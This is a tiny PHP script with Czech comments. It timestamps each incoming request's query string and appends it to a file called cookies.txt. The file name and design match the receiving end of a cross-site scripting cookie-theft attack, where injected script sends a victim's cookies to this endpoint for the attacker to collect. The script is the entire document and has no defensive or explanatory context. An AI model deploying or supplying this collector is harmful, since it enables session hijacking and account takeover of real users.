<?php

// ziskam data
$line = "[". date("Y-m-d_H-i-s"). "]  "
        .$_SERVER["QUERY_STRING"] ."\n";

// ulozim do souboru
file_put_contents(
    "cookies.txt",
    $line,
    FILE_APPEND
);

?>